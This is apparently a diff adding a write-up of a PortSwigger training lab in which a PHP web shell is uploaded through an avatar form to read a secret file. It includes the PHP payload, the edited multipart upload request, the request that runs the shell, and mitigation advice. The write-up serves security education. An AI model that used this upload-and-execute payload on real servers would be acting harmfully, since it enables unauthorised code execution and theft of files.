@@ -1,0 +1,86 @@
+Remote Code Execution via Web Shell Upload
+Lab Difficulty: Apprentice
+Vulnerability Type: File Upload / Remote Code Execution (RCE)
+Lab Link: PortSwigger Lab
+
+Summary
+This lab demonstrates a common vulnerability in file upload functionalities. The server does not properly validate uploaded files, allowing attackers to upload and execute malicious PHP code. 
+By exploiting this behavior, it’s possible to execute arbitrary server-side commands and retrieve sensitive information.
+
+Objective
+Upload a PHP web shell to the application, use it to read the contents of /home/carlos/secret, and submit the extracted secret to complete the lab.
+
+Technical Walkthrough
+1. Reconnaissance
+Logged in using the provided credentials: wiener:peter
+
+Navigated to the account profile section, which contains an avatar upload feature
+
+Uploaded a sample image (.jpg) and observed its URL in the profile preview
+
+Monitored HTTP traffic in Burp Suite and identified the uploaded image being retrieved via:
+
+GET /files/avatars/<filename>.jpg
+This confirmed that uploaded files are publicly accessible and served from the /files/avatars/ directory.
+
+2. Creating a Web Shell
+Created a PHP script named exploit.php with the following payload:
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+This script reads and prints the contents of the secret file located in Carlos’s home directory.
+
+3. Uploading the Web Shell
+Revisited the avatar upload functionality
+
+Used Burp Suite Intercept to capture the upload request
+
+Modified the multipart form data in the request to change:
+
+The filename to exploit.php
+
+The Content-Type header to application/x-php
+
+The request body to contain the PHP payload
+
+Modified POST request:
+
+
+POST /my-account/avatar HTTP/1.1
+Host: <LAB-ID>.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/x-php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+------WebKitFormBoundary--
+The server responded with a 200 OK status, confirming the upload was accepted.
+
+4. Executing the Payload
+Sent a GET request via Burp Repeater to the uploaded shell:
+
+
+GET /files/avatars/exploit.php HTTP/1.1
+Host: <LAB-ID>.web-security-academy.net
+The server executed the PHP script and responded with the contents of the secret file:
+
+
+w5nH2V...<redacted>...
+Result
+The extracted secret was submitted through the lab interface, and the challenge was successfully completed.
+
+
+Mitigation
+To prevent this vulnerability in real-world applications:
+
+Implement strict file type validation on both the client and server sides
+
+Restrict allowed file extensions (e.g., .jpg, .png) and verify MIME types
+
+Use secure file storage paths, and never execute uploaded files
+
+Rename uploaded files and remove executable permissions
+
+If using PHP, disable execution in upload directories using .htaccess or server configuration
+
